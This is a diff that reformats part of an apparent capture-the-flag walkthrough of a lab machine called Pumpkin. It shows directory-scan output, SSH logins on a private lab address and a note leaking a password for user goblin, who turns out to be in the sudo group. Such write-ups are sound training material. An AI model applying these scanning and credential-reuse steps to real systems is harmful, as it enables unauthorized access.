@@ -80,7 +80,7 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 http://10.0.2.15:1515/img/ +
 
 http://10.0.2.15:1515/index.html (CODE:200\|SIZE:903)  
-+ http://10.0.2.15:1515/server-status (CODE:403\|SIZE:291)
+http://10.0.2.15:1515/server-status (CODE:403\|SIZE:291)
 
 \---- Entering directory: http://10.0.2.15:1515/img/ ---- (!) WARNING: Directory
 IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway)
@@ -119,6 +119,7 @@ continue connecting (yes/no)? yes Warning: Permanently added '[10.0.2.15]:3535'
 | scarecrow\@10.0.2.15's password: Last login: Thu Jul 4 00:57:32 2019 from 10.0.2.5 scarecrow\@Pumpkin:\~\$ ls note.txt scarecrow\@Pumpkin:\~\$ cat note.txt          |
 |----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
 | Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! Reach out to goblin and share this "Y0n\$M4sy3D1t" to secretly get keys from LordPumpkin. |
+
 | \#user goblin                                                                                                                                                        |
 | [root\@parrot]─[/home/user] └──╼ \#ssh goblin\@10.0.2.15 -p 3535                                                                                                     |
 
@@ -130,8 +131,9 @@ continue connecting (yes/no)? yes Warning: Permanently added '[10.0.2.15]:3535'
 goblin\@10.0.2.15's password: Permission denied, please try again.
 
 goblin\@10.0.2.15's password: Last login: Thu Jul 4 01:29:59 2019 from 10.0.2.5
-goblin\@Pumpkin:\~\$ id uid=1002(goblin) gid=1002(goblin)
-groups=1002(goblin),27(sudo)
+
+goblin\@Pumpkin:\~\$ id 
+uid=1002(goblin) gid=1002(goblin) groups=1002(goblin),27(sudo)
 
 goblin\@Pumpkin:\~\$ ls note
 
